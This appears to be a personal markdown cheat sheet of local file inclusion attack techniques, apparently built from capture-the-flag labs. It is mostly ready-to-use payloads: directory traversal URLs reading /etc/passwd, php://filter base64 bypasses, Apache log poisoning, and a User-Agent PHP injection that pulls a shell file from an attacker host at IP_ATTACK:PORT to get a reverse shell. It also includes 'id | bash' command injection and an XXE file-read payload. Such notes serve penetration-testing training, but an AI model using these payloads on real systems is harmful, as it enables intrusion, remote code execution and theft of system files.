---
title: LFI 🎃
---

## Classic ones

- If you find the php code with the filter like:

```php
        <?php

	    //FLAG: thm{explo1t1ng_lf1}

            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    if(isset($_GET["view"])){
	    if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
            	include $_GET['view'];
            }else{

		echo 'Sorry, Thats not allowed';
            }
	}
        ?>
```

- You can just apply a filter like: `http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//../etc/passwd`

## Adding parameter file to url

- Linux File Inclussion
  - Check the `url` adding parameter `file`

![](Pasted%20image%2020240213235821.png)

## Fuzzing it

- FUZZ it using this command:
  - [Useful wordlist found here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/)

```shell
wfuzz -c -w dirTraversal.txt  --hw 0 http://10.10.70.109/?view=FUZZ
```


## Bypassing filters with encodings


- If the backend is filtering by checking the input, try this:

```shell
http://IP/?view=php://filter/FOLDER/convert.base64-encode/resource=index

# example
http://mafialive.thm/test.php?view=//filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php
```

- Check out the &ext variable and put it empty because it won't get the file extension

## Log poisoning

- To perform this, first check out if you have access to the log file in an apache with Burpsuite:



- Log file contamination

```shell
http://IP/?view=dog../../../../../cat/../var/log/apache2/access.log&ext=
```


## Exploiting the User-Agent field

- Exploit the User-Agent Field:
  - First create a shell like the PentestMonkey one
  - Create a python server
  - Load the petition (like log file contamination petition) and capture it with BurpSuite
  - Modify the User-Agent field with this command:

```shell
<?php file_put_contents('shell.php', file_get_contents('http://IP_ATTACK:PORT/shell.php'))?>
```

- Then access to `http://IP/shell.php` and you got the reverse shell

## Regex filtering

When we can echo commands try and it's using a regex like: `/[#!@%^&*()$_=\[\]\';,{}:>?~\\\\]/` try:

```shell
http://IP_HOST/echo.php?search=id+|+bash
# Then just try other commands like
echo.php?search=ls+|+bash
# Then try to input a reverse shell
```

## Web filtering

If a web shell filters your input, try to encode it into `base64`

![](Pasted%20image%2020240417160455.png)

- If it doesn't work, try some [Command Injection 💄](command_injection.md)

## XML file inclusion (XXE)

- If a web accepts XML, it could be vulnerable to XXE.
- You can try to upload a code like this to inspect the system:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
   <!ELEMENT data ANY >
   <!ENTITY name SYSTEM "file:///etc/passwd" >]>
<comment>
  <name>&name;</name>
  <author>Pavandeep</author>
  <com>Hacking Articles</com>
</comment>
```

- Change the `"file:///etc/passwd"` for the one you want